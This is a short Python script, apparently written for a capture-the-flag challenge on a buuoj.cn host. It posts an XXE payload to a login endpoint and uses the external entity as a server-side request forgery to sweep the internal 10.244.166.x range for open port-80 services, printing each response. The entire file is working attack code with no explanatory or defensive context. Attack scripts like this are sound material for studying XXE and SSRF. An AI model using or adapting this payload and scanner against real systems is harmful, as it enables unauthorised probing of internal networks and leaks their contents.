import requests
import sys

url = "http://6da84da2-6614-4fbd-a8a7-f77474fa0c0b.node5.buuoj.cn:81/doLogin.php"

def test_ip(ip, port=80):
    payload = f'''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "http://{ip}:{port}/">
]>
<user><username>&xxe;</username><password>test</password></user>'''
    
    try:
        r = requests.post(url, data=payload, headers={"Content-Type": "application/xml;charset=utf-8"}, timeout=2)
        if "failed to open stream" not in r.text and "Connection refused" not in r.text:
            print(f"[+] {ip}:{port} - OPEN")
            print(r.text[:500])
            return True
        return False
    except:
        return False

# Try 10.244.166.x range
for i in range(1, 255):
    ip = f"10.244.166.{i}"
    test_ip(ip)
